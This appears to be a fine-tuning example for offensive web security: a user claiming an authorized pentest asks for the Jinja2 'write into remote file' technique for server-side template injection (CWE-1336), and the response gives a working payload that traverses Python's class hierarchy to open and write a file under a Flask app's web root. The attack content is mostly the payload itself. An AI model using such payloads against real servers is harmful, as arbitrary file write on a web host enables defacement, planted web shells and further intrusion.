# SSTI — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: ssti
- cwe: CWE-1336

## Scenario

I'm doing an authorized pentest and need the Jinja2 - Write Into Remote File approach for Server Side Template Injection. Walk me through it with payloads.

## Analysis / Response

**Jinja2 - Write Into Remote File** — this technique applies to Server Side Template Injection. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```
